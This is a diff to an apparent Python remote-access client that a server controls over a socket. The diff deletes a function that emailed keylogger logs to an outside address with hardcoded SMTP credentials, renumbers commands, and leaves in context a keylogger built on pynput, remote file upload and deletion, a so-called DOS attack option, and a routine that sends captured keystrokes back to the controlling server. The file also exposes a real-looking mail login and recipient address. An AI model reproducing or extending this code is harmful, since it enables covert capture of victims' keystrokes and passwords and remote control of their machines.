@@ -2,41 +2,8 @@ import time
 import socket
 import os
 import platform
-import smtplib
 from datetime import datetime
 from pynput import keyboard
-
-# SMTP configuration
-SMTP_SERVER = 'mail.smtp2go.com'
-SMTP_PORT = 2525
-SMTP_USER = 'hack_hack'
-SMTP_PASSWORD = 'mahinthegay'
-TO_EMAIL = '2320030263@klh.edu.in'
-SUBJECT = 'Log File'
-
-# Function to send the log file via email
-def send_email(log_file):
-    msg = MIMEMultipart()
-    msg['From'] = SMTP_USER
-    msg['To'] = TO_EMAIL
-    msg['Subject'] = SUBJECT
-
-    body = 'Please find the attached log file.'
-    msg.attach(MIMEText(body, 'plain'))
-
-    with open(log_file, 'rb') as attachment:
-        part = MIMEBase('application', 'octet-stream')
-        part.set_payload(attachment.read())
-        encoders.encode_base64(part)
-        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(log_file)}')
-        msg.attach(part)
-
-    server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
-    server.starttls()
-    server.login(SMTP_USER, SMTP_PASSWORD)
-    text = msg.as_string()
-    server.sendmail(SMTP_USER, TO_EMAIL, text)
-    server.quit()
 
 # Function to start the keylogger
 def start_keylogger(s):
@@ -55,7 +22,6 @@ def start_keylogger(s):
     # Keep the listener running
     listener.join()
 
-    send_email(log_file)
     send_log_to_server(log_file, s)
 
 # Function to send the log file to the server
@@ -100,9 +66,6 @@ while True:
             print("Executing DOS Attack command.")
             os.system("start msedge.exe https://www.example.com" if platform.system() == "Windows" else "xdg-open https://www.example.com")
         elif command == "4":
-            print("Executing Shantabhai command.")
-            os.system("start msedge.exe https://www.youtube.com/watch?v=Uk65cmPGl8s" if platform.system() == "Windows" else "xdg-open https://www.youtube.com/watch?v=Uk65cmPGl8s")
-        elif command == "5":
             print("Executing file transfer command.")
             file_info = s.recv(1024).decode().strip()
             if "|" not in file_info:
@@ -132,7 +95,7 @@ while True:
                 print(f"File {file_name} received successfully.")
             else:
                 print("File transfer incomplete.")
-        elif command == "6":
+        elif command == "5":
             print("Executing remove file command.")
             file_path = s.recv(1024).decode().strip()
             try:
@@ -145,10 +108,10 @@ while True:
                 print(f"Permission denied: Unable to remove file '{file_path}'.")
             except Exception as e:
                 print(f"An error occurred: {e}")
-        elif command == "7":
+        elif command == "6":
             print("Executing keylogger command.")
             start_keylogger(s)
-        elif command == "8":
+        elif command == "7":
             print("Executing exit command.")
             print("Server requested disconnection.")
             s.close()
